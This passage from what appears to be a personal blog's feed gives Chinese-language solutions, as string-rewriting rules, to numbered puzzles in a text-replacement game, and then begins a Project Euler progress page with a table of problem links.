class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ii:iwi</span><br></pre></td></tr></table></figure></p><h2 id="0006"><a href="#0006" class="headerlink" title="0006"></a>0006</h2><p>对ABC进行排序,枚举三种将要进行的排序准则分别替换即可.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BA:AB</span><br><span class="line">CB:BC</span><br><span class="line">BA:AC</span><br></pre></td></tr></table></figure></p><h2 id="0007"><a href="#0007" class="headerlink" title="0007"></a>0007</h2><p>给一段<code>o</code>判断有奇数个还是偶数个.<br>发现两个<code>o</code>没有贡献,直接消掉,最后判断即可.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">oo:</span><br><span class="line">o::odd</span><br><span class="line">::even</span><br></pre></td></tr></table></figure><br>(注意先判有的odd,因为even是兜底的)</p><h2 id="0008"><a href="#0008" class="headerlink" title="0008"></a>0008</h2><p>给一段只有<code>b</code>的串,加一个<code>s</code>在末尾.<br>首先考虑<code>bb</code>变成<code>bsb</code>,然后掉转顺序变成<code>bbs</code>,最后删掉所有的<code>bsb</code>.写出来长这样:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bb:bsb</span><br><span class="line">sb:bs</span><br><span class="line">bsb:bb</span><br></pre></td></tr></table></figure></p><p>考虑<strong>顺序优化</strong>.每次查子串是从第一句开始查,也就是符合条件的语句编号越小越优先执行,调整一下:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sb:bs</span><br><span class="line">bb:bsb</span><br><span class="line">bsb:bb</span><br></pre></td></tr></table></figure></p><p>这个时候我们发现,他变成了一直往尾部加<code>s</code>,一个,两个…<br>我们让<code>b</code>变成<code>bs</code>,然后把<code>sb:bs</code>的交换优先级调整的比添加高,就可以顺到最后了,然后<code>ss::s</code>结束.(<code>bb:bsb</code>会WA,只有一个<code>b</code>的情况)AC代码:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ss::s</span><br><span class="line">sb:bs</span><br><span class="line">b:bs</span><br></pre></td></tr></table></figure></p><h2 id="0009"><a href="#0009" class="headerlink" title="0009"></a>0009</h2><p>给一个二进制串,按位反转.<br>交换,肯定有个tmp的防止反转再反转,于是<code>0</code>先换成<code>2</code>,再换成<code>1</code>,<code>1</code>也一样,调一下优先级.</p><p>发现死循环了.注意到,即使是结果也是可以当输入的,我们要手动结束程序,于是考虑扫描,从左插一个<code>a</code>,每次枚举<code>a</code>左边的进行反转,<code>a</code>到头结束.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a0:<span class="number">1</span>a</span><br><span class="line">a1:<span class="number">0</span>a</span><br><span class="line">a::</span><br><span class="line">:a</span><br></pre></td></tr></table></figure></p><h2 id="0010"><a href="#0010" class="headerlink" title="0010"></a>0010</h2><p>写一个加法器.<br>我们需要插一个东西在末尾.我们如何判定他插到末尾了?<br><strong>答:</strong> 插两个的时候.(第一个不动了说明到头了,第二个到头的时候会碰到第一个)<br>然后程序向前遍历就很好写了.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>ss::<span class="number">1</span></span><br><span class="line"><span class="number">1</span>ss:ss0</span><br><span class="line">ss::<span class="number">1</span></span><br><span class="line">s0:<span class="number">0</span>s</span><br><span class="line">s1:<span class="number">1</span>s</span><br><span class="line">:s</span><br></pre></td></tr></table></figure></p><h2 id="0011"><a href="#0011" class="headerlink" title="0011"></a>0011</h2><p>计数.<br>首先,每一个o都是看成1,进位的时候直接放到左边.<br>数之间不允许直接加,否则会乱位,于是调整一下<code>o</code>变成<code>1</code>的优先级即可.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>o:<span class="number">1</span></span><br><span class="line"><span class="number">1</span>o:<span class="number">2</span></span><br><span class="line"><span class="number">2</span>o:<span class="number">3</span></span><br><span class="line"><span class="number">3</span>o:<span class="number">4</span></span><br><span class="line"><span class="number">4</span>o:<span class="number">5</span></span><br><span class="line"><span class="number">5</span>o:<span class="number">6</span></span><br><span class="line"><span class="number">6</span>o:<span class="number">7</span></span><br><span class="line"><span class="number">7</span>o:<span class="number">8</span></span><br><span class="line"><span class="number">8</span>o:<span class="number">9</span></span><br><span class="line"><span class="number">9</span>o:o0</span><br><span class="line">o:<span class="number">1</span></span><br></pre></td></tr></table></figure></p><h2 id="0012"><a href="#0012" class="headerlink" title="0012"></a>0012</h2><p>会11的话12就很简单了.反向搞就行,注意0作为进位标志最后再摘.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>:<span class="number">0</span>o</span><br><span class="line"><span class="number">2</span>:<span class="number">0</span>oo</span><br><span class="line"><span class="number">3</span>:<span class="number">0</span>ooo</span><br><span class="line"><span class="number">4</span>:<span class="number">0</span>oooo</span><br><span class="line"><span class="number">5</span>:<span class="number">0</span>ooooo</span><br><span class="line"><span class="number">6</span>:<span class="number">0</span>oooooo</span><br><span class="line"><span class="number">7</span>:<span class="number">0</span>ooooooo</span><br><span class="line"><span class="number">8</span>:<span class="number">0</span>oooooooo</span><br><span class="line"><span class="number">9</span>:<span class="number">0</span>ooooooooo</span><br><span class="line">o0:<span class="number">0</span>oooooooooo</span><br><span class="line"><span class="number">0</span>:</span><br></pre></td></tr></table></figure></p><h2 id="0013"><a href="#0013" class="headerlink" title="0013"></a>0013</h2><h2 id="0014"><a href="#0014" class="headerlink" title="0014"></a>0014</h2><h2 id="0015"><a href="#0015" class="headerlink" title="0015"></a>0015</h2><h2 id="0016"><a href="#0016" class="headerlink" title="0016"></a>0016</h2><p>比5长的直接迭代缩减即可.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oooooo:ooooo</span><br></pre></td></tr></table></figure></p><h2 id="0017"><a href="#0017" class="headerlink" title="0017"></a>0017</h2><p>比5短的直接迭代增加即可.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ooooo::ooooo</span><br><span class="line">:o</span><br></pre></td></tr></table></figure></p><h2 id="0018"><a href="#0018" class="headerlink" title="0018"></a>0018</h2><p>判断<code>ox</code>序列哪个多,输出<code>win,lose,draw</code>.<br>难点在于6行内完成.题解借用很长一段<code>x</code>保证<code>xo</code>一定能消掉<code>o</code>,从而完成消掉另一方,然后再归还<code>x</code>,多就是输,默认赢,不变就是平手.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xo:</span><br><span class="line">win+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:lose+</span><br><span class="line">win+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:draw+</span><br><span class="line">+x:+</span><br><span class="line">+::</span><br><span class="line">:win+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure></p><h2 id="0019"><a href="#0019" class="headerlink" title="0019"></a>0019</h2><p>发现排好序一定是<code>12345</code>,考虑如何把12345搞掉:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>:</span><br><span class="line"><span class="number">2</span>:</span><br><span class="line"><span class="number">3</span>:</span><br><span class="line"><span class="number">4</span>:</span><br><span class="line"><span class="number">5</span>::<span class="number">12345</span></span><br></pre></td></tr></table></figure></p><h2 id="0020"><a href="#0020" class="headerlink" title="0020"></a>0020</h2><p>给一个数字串,在每两个数字间加点.<br>直接扫描即可.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a0:<span class="number">0.</span>a</span><br><span class="line">a1:<span class="number">1.</span>a</span><br><span class="line">a2:<span class="number">2.</span>a</span><br><span class="line">a3:<span class="number">3.</span>a</span><br><span class="line">a4:<span class="number">4.</span>a</span><br><span class="line">a5:<span class="number">5.</span>a</span><br><span class="line">a6:<span class="number">6.</span>a</span><br><span class="line">a7:<span class="number">7.</span>a</span><br><span class="line">a8:<span class="number">8.</span>a</span><br><span class="line">a9:<span class="number">9.</span>a</span><br><span class="line">.a::</span><br><span class="line">:a</span><br></pre></td></tr></table></figure></p><h2 id="0023"><a href="#0023" class="headerlink" title="0023"></a>0023</h2><p>给一个数列(只有<code>012</code>),求他们的和模3.<br>显然暴力是会超行的,考虑替换,把0替换成111,2换成11就可以很简单的消除了.但是注意一个小坑是<code>111:</code>错<code>1111:1</code>对,因为假如最后没数字了就寄了.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">111</span></span><br><span class="line"><span class="number">2</span>:<span class="number">11</span></span><br><span class="line"><span class="number">1111</span>:<span class="number">1</span></span><br><span class="line"><span class="number">111</span>::<span class="number">0</span></span><br><span class="line"><span class="number">11</span>::<span class="number">2</span></span><br></pre></td></tr></table></figure></p><h2 id="0032"><a href="#0032" class="headerlink" title="0032"></a>0032</h2><p>发现值域很窄,直接枚举.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xo:x</span><br><span class="line">oooooooooooooooooooooooooooooooo:<span class="number">5</span>x</span><br><span class="line">oooooooooooooooo:<span class="number">4</span>x</span><br><span class="line">oooooooo:<span class="number">3</span>x</span><br><span class="line">oooo:<span class="number">2</span>x</span><br><span class="line">oo:<span class="number">1</span>x</span><br><span class="line">o:<span class="number">0</span>x</span><br><span class="line">x::</span><br></pre></td></tr></table></figure></p><h2 id="0035"><a href="#0035" class="headerlink" title="0035"></a>0035</h2><p>把第三个字符替换成<code>x</code>.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ooo::oox</span><br></pre></td></tr></table></figure></p><h2 id="0036"><a href="#0036" class="headerlink" title="0036"></a>0036</h2><p>把倒数第三个字符替换成<code>x</code>,插一个a,扫到末尾结束.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ao:oa</span><br><span class="line">oooa::xoo</span><br><span class="line">:a</span><br></pre></td></tr></table></figure></p><h2 id="0037"><a href="#0037" class="headerlink" title="0037"></a>0037</h2><p>直接替换,注意第一个问号的优先级是最低的.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">m?:ma</span><br><span class="line">a?:ar</span><br><span class="line">r?:rk</span><br><span class="line">k?:ko</span><br><span class="line">o?:ov</span><br><span class="line">?:m</span><br></pre></td></tr></table></figure></p><h2 id="0038"><a href="#0038" class="headerlink" title="0038"></a>0038</h2><p>发现转移的时候多余的o会没,但是最终状态的o也会跟着没,考虑扫描.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xbob:oxb</span><br><span class="line">xb:x</span><br><span class="line">xo:x</span><br><span class="line">x::</span><br><span class="line">:x</span><br></pre></td></tr></table></figure></p><h2 id="0045"><a href="#0045" class="headerlink" title="0045"></a>0045</h2><p>直接删掉<code>-</code>即可.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-:</span><br></pre></td></tr></table></figure></p><h2 id="0048"><a href="#0048" class="headerlink" title="0048"></a>0048</h2><p>找最大公因数即可.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ooo:oof</span><br><span class="line">oofoofoofoofoof:oofobfoofbofooz</span><br><span class="line">oofoofoofo:oofobfoofb</span><br><span class="line">oofoo:oofob</span><br></pre></td></tr></table></figure></p><h2 id="0049"><a href="#0049" class="headerlink" title="0049"></a>0049</h2><p>直接替换.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bb:ba</span><br></pre></td></tr></table></figure></p><h2 id="0050"><a href="#0050" class="headerlink" title="0050"></a>0050</h2><p>替换小心头部重复替换.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aa:ba</span><br><span class="line">bbb:bab</span><br></pre></td></tr></table></figure></p><h2 id="0051"><a href="#0051" class="headerlink" title="0051"></a>0051</h2><p>扫描一遍即可.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zab:baz</span><br><span class="line">z::</span><br><span class="line">:z</span><br></pre></td></tr></table></figure></p><h2 id="0052"><a href="#0052" class="headerlink" title="0052"></a>0052</h2><p>来一个被减数,左右对消即可.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ozo:z</span><br><span class="line">z::</span><br><span class="line">:ooooooooooz</span><br></pre></td></tr></table></figure></p><h2 id="0053"><a href="#0053" class="headerlink" title="0053"></a>0053</h2><p>这里开始是几道闪电题,意思是尽快做出来而不是压行做出来,题目也非常难.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xoo:ox</span><br><span class="line">x::</span><br><span class="line">:x</span><br></pre></td></tr></table></figure></p><h2 id="0054"><a href="#0054" class="headerlink" title="0054"></a>0054</h2><h2 id="0061"><a href="#0061" class="headerlink" title="0061"></a>0061</h2><p>冒号不能动,右边减一个左边加一个即可.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(:</span><br><span class="line">::(</span><br></pre></td></tr></table></figure></p><h2 id="0062"><a href="#0062" class="headerlink" title="0062"></a>0062</h2><p>考虑整体转变,<code>00</code>先变成<code>01</code>再一个变成<code>00</code>.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">01</span></span><br><span class="line"><span class="number">01</span>::<span class="number">00</span></span><br></pre></td></tr></table></figure></p><h2 id="0063"><a href="#0063" class="headerlink" title="0063"></a>0063</h2><p>打印空格.由于前导/尾随空格都会没,我们要构造两面包夹的形态.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">114514</span>:</span><br><span class="line"><span class="number">1919810</span>::</span><br><span class="line">:<span class="number">114514</span> <span class="number">1919810</span></span><br></pre></td></tr></table></figure></p><h2 id="0064"><a href="#0064" class="headerlink" title="0064"></a>0064</h2><p>我们要去掉中间的空格,显然扫描线做.<br>注意到我们开头要插入一个没空格的,这里是没法转移的.我们考虑插一个形如<code>x y</code>的结构,然后再把y去掉,就可以成功转移了.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x a:ax</span><br><span class="line">x b:bx</span><br><span class="line">x c:cx</span><br><span class="line">y:</span><br><span class="line">x::</span><br><span class="line">:x y</span><br></pre></td></tr></table></figure></p><h2 id="0069"><a href="#0069" class="headerlink" title="0069"></a>0069</h2><p>注意到数据是4个<code>t</code>起手,考虑做一个头然后沿伸.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">testtt:testtest</span><br><span class="line">tttt:testtest</span><br></pre></td></tr></table></figure></p><h2 id="0078"><a href="#0078" class="headerlink" title="0078"></a>0078</h2><p>直接查找.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iwi::[iwi]</span><br></pre></td></tr></table></figure></p><h2 id="0079"><a href="#0079" class="headerlink" title="0079"></a>0079</h2><p>最优解只有四行,而且结果可以作为输入,只好使用扫描线.但是扫描头添加(2),转移(2),检测(1),超了,要魔改.</p><p>鉴于只有<code>iw</code>,可以构造:很多<code>iiiiii</code>,然后不用转移<code>ii</code>,转移<code>iw</code>,就结束了.正好四行.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iiiiiiiiiiiiiiiiiiiiiiwi:[iwi]iiiiiiiiiiiiiiiiiiiii</span><br><span class="line">iiiiiiiiiiiiiiiiiiiiiw:wiiiiiiiiiiiiiiiiiiiii</span><br><span class="line">iiiiiiiiiiiiiiiiiiiii::</span><br><span class="line">:iiiiiiiiiiiiiiiiiiiii</span><br></pre></td></tr></table></figure></p><h2 id="0080"><a href="#0080" class="headerlink" title="0080"></a>0080</h2><p>发现拆括号的过程就是放到外面然后乘二即可.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">o]:]oo</span><br><span class="line">[]:</span><br></pre></td></tr></table></figure></p><h2 id="0083"><a href="#0083" class="headerlink" title="0083"></a>0083</h2><p>判断子序列是否含有 <code>2021</code> .<br>一个很naive的想法是,开局插一个字母,然后遍历碰到子序列就变字母,直到最后判断是不是.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">a2:b</span><br><span class="line">b0:c</span><br><span class="line">c2:d</span><br><span class="line">d1:e<span class="comment">//子序列匹配上</span></span><br><span class="line"></span><br><span class="line">a0:a</span><br><span class="line">a1:a</span><br><span class="line">b1:b</span><br><span class="line">b2:b</span><br><span class="line">c0:c</span><br><span class="line">c1:c</span><br><span class="line">d0:d</span><br><span class="line">d2:d</span><br><span class="line">e0:e</span><br><span class="line">e1:e</span><br><span class="line">e2:e<span class="comment">//字母移动</span></span><br><span class="line"></span><br><span class="line">e::yes</span><br><span class="line">b::no</span><br><span class="line">c::no</span><br><span class="line">d::no</span><br><span class="line">aa::no<span class="comment">//判断</span></span><br><span class="line"></span><br><span class="line">:a<span class="comment">//如果实在没有了(开局或者没字母了)会再插一个字符</span></span><br></pre></td></tr></table></figure><br>然而最优解七行…<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:no</span><br><span class="line"><span class="number">2</span>no2nononononononononononononononono:nnoo</span><br><span class="line"><span class="number">2</span>nononononononononononononononono:nononononononononononononononono2</span><br><span class="line">on:</span><br><span class="line"><span class="number">1</span>:<span class="number">0000000000000000</span></span><br><span class="line"><span class="number">2</span>:no</span><br><span class="line">nnoo:yes</span><br></pre></td></tr></table></figure><br>大致意思是,把0换成no,把2021换成nnoo(yes),然后no会被最后消成一个,如果出现yes也会消,最后判断,非常仙的思路.</p><h2 id="0084"><a href="#0084" class="headerlink" title="0084"></a>0084</h2><h2 id="0085"><a href="#0085" class="headerlink" title="0085"></a>0085</h2><p>我们考虑同质化,把他们变成0+啥,然后由于最后一个数字也肯定是<code>0+</code>,所以考虑<code>+0:0</code>,然后最后转化回去就可以了.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span>:<span class="number">0</span>++</span><br><span class="line"><span class="number">1</span>:<span class="number">0</span>+</span><br><span class="line">+<span class="number">0</span>:<span class="number">0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0</span></span><br><span class="line"><span class="number">0</span>++::<span class="number">2</span></span><br><span class="line"><span class="number">0</span>+::<span class="number">1</span></span><br></pre></td></tr></table></figure></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;接触了一种&lt;a href=&quot;https://mao.snuke.org/&quot;&gt;全新游戏&lt;/a&gt;.&lt;/p&gt;
&lt;h1 id=&quot;规则&quot;&gt;&lt;a href=&quot;#规则&quot; class=&quot;headerlink&quot; title=&quot;规则&quot;&gt;&lt;/a&gt;规则&lt;/h1&gt;&lt;p&gt;这是一种简单的语言,只有两个语</summary>
      
    
    
    
    <category term="GAME" scheme="https://narafluorine.github.io/categories/GAME/"/>
    
    
    <category term="Algorithm" scheme="https://narafluorine.github.io/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>欧拉计划</title>
    <link href="https://narafluorine.github.io/2024/11/11/20007_%E6%AC%A7%E6%8B%89%E8%AE%A1%E5%88%92/"/>
    <id>https://narafluorine.github.io/2024/11/11/20007_%E6%AC%A7%E6%8B%89%E8%AE%A1%E5%88%92/</id>
    <published>2024-11-11T12:24:34.000Z</published>
    <updated>2026-01-06T16:29:06.449Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://projecteuler.net">欧拉计划</a></p><h1>Warning</h1><blockquote><p>本题解含有大量AI生成内容(AI-Generated Code),如观感不适请立刻关闭页面!</p></blockquote><blockquote><p>Flu应当保证prompt包含自己认为可行的方法,不要让AI代替自己思考.</p></blockquote><h1>Progress</h1><p>大部分页面是空白的,有时间会补wp(古早的题目未保留题解,好在较晚做出来的题目均已上题解).<br>wp(write up)=sol(solution)=exp(exploit)=题解</p><table><thead><tr><th style="text-align:center">0000</th><th style="text-align:center">0100</th><th style="text-align:center">0200</th><th style="text-align:center">0300</th><th style="text-align:center">0400</th><th style="text-align:center">0500</th><th style="text-align:center">0600</th><th style="text-align:center">0700</th><th style="text-align:center">0800</th><th style="text-align:center">0900</th><th style="text-align:center">1000</th></tr></thead><tbody><tr><td style="text-align:center"><a href="../../../../project-euler/0001">1</a></td><td style="text-align:center"><a href="../../../../project-euler/0101">101</a></td><td style="text-align:center"><a href="../../../../project-euler/0201">201</a></td><td style="text-align:center"><a href="../../../../project-euler/0301">301</a></td><td style="text-align:center"><a href="../../../../project-euler/0401">401</a></td><td style="text-align:center"><a href="../../../../project-euler/0501">501</a></td><td style="text-align:center"><a href="../../../../project-euler/0601">601</a></td><td style="text-align:center"><a href="../../../../project-euler/0701">701</a></td><td style="text-align:center"><a href="../../../../project-euler/0801">801</a></td><td style="text-align:center"><a href="../../../../project-euler/0901">901</a></td><td style="text-align:center"><a href="../../../../project-euler/1001">1001</a></td></tr><tr><td style="text-align:center"><a href="../../../../project-euler/0002">2</a></td><td style="text-align:center"><a href="../../../../project-euler/0102">102</a></td><td style="text-align:center"><a href="../../../../project-euler/0202">202</a></td><td style="text-align:center"><a href="../../../../project-euler/0302">302</a></td><td style="text-align:center"><a href="../../../../project-euler/0402">402</a></td><td style="text-align:center"><a href="../../../../project-euler/0502">502</a></td><td style="text-align:center"><a href="../../../../project-euler/0602">602</a></td><td style="text-align:center"><a href="../../../../project-euler/0702">702</a></td><td style="text-align:center"><a href="../../../../project-euler/0802">802</a></td><td style="text-align:center"><a href="../../../../project-euler/0902">902</a></td><td style="text-align:center"><a href="../../../../project-euler/1002">1002</a></td></tr><tr><td style="text-align:center"><a href="../../../../project-euler/0003">3</a></td><td style="text-align:center"><a href="../../../../project-euler/0103">103</a></td><td style="text-align:center"><a href="../../../../project-euler/0203">203</a></td><td style="text-align:center"><a href="../../../../project-euler/0303">303</a></td><td style="text-align:center"><a href="../../../../project-euler/0403">403</a></td><td style="text-align:center"><a href="../../../../project-euler/0503">503</a></td><td style="text-align:center"><a href="../../../../project-euler/0603">603</a></td><td style="text-align:center"><a href="../../../../project-euler/0703">703</a></td><td style="text-align:center"><a href="../../../../project-euler/0803">803</a></td><td style="text-align:center"><a href="../../../../project-euler/0903">903</a></td><td style="text-align:center"><a href="../../../../project-euler/1003">1003</a></td></tr><tr><td style="text-align:center"><a href="../../../../project-euler/0004">4</a></td><td style="text-align:center"><a href="../../../../project-euler/0104">104</a></td><td style="text-align:center"><a href="../../../../project-euler/0204">204</a></td><td style="text-align:center"><a href="../../../../project-euler/0304">304</a></td><td style="text-align:center"><a href="../../../../project-euler/0404">404</a></td><td style="text-align:center"><a href="../../../../project-euler/0504">504</a></td><td style="text-align:center"><a href="../../../../project-euler/0604">604</a></td><td style="text-align:center"><a href="../../../../project-euler/0704">704</a></td><td style="text-align:center"><a href="../../../../project-euler/0804">804</a></td><td style="text-align:center"><a href="../../../../project-euler/0904">904</a></td><td style="text-align:center"><a href="../../../../project-euler/1004">1004</a></td></tr><tr><td style="text-align:center"><a href="../../../../project-euler/0005">5</a></td><td style="text-align:center"><a href="../../../../project-euler/0105">105</a></td><td style="text-align:center"><a href="../../../../project-euler/0205">205</a></td><td style="text-align:center"><a href="../../../../project-euler/0305">305</a></td><td style="text-align:center"><a href="../../../../project-euler/0405">405</a></td><td style="text-align:center"><a href="../../../../project-euler/0505">505</a></td><td style="text-align:center"><a href="../../../../project-euler/0605">605</a></td><td style="text-align:center"><a href="../../../../project-euler/0705">705</a></td><td style="text-align:center"><a href="../../../../project-euler/0805">805</a></td><td style="text-align:center"><a href="../../../../project-euler/0905">905</a></td><td style="text-align:center"><a href="../../../../project-euler/1005">1005</a></td></tr><tr><td style="text-align:center"><a href="../../../../project-euler/0006">6</a></td><td style="text-align:center"><a href="../../../../project-euler/0106">106</a></td><td style="text-align:center"><a href="../../../../project-euler/0206">206</a></td><td style="text-align:center"><a href="../../../../project-euler/0306">306</a></td><td style="text-align:center"><a href="../../../../project-euler/0406">406</a></td><td style="text-align:center"><a href="../../../../project-euler/0506">506</a></td><td style="text-align:center"><a href="../../../../project-euler/0606">606</a></td><td style="text-align:center"><a href="../../../../project-euler/0706">706</a></td><td style="text-align:center"><a href="../../../../project-euler/0806">806</a></td><td style="text-align:center"><a href="../../../../project-euler/0906">906</a></td><td style="text-align:center"><a href="../../../../project-euler/1006">1006</a></td></tr><tr><td style="text-align:center"><a href="../../../../project-euler/0007">7</a></td><td style="text-align:center"><a href="../../../../project-euler/0107">107</a></td><td style="text-align:center"><a href="../../../../project-euler/0207">207</a></td><td style="text-align:center"><a href="../../../../project-euler/0307">307</a></td><td style="text-align:center"><a href="../../../../project-euler/0407">407</a></td><td style="text-align:center"><a href="../../../../project-euler/0507">507</a></td><td style="text-align:center"><a href="../../../../project-euler/0607">607</a></td><td style="text-align:center"><a href="../../../../project-euler/0707">707</a></td><td style="text-align:center"><a href="../../../../project-euler/0807">807</a></td><td style="text-align:center"><a 